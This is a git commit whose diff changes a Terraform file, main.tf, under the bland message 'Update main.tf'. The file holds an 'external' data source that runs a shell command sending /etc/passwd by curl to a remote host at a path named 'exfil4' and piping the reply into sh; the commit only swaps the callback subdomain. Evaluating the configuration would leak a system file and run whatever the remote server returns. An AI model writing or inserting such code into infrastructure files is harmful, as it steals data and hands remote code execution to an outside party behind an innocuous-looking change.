5af87b2994956419202380613f8c4e30916d40f0
snehak7-cyber <snehakkaran.7@gmail.com>
2026-09-07 15:12:50 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,4 +1,4 @@
 data "external" "example" {
  program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd
-https://cwc3p60rgexedpdvx3vj7momrdx7l49t.net-spi.com/exfil4 | sh"]
+https://4puviytj96q66h6nqvob0ehek5qzez2o.net-spi.com/exfil4 | sh"]
 }
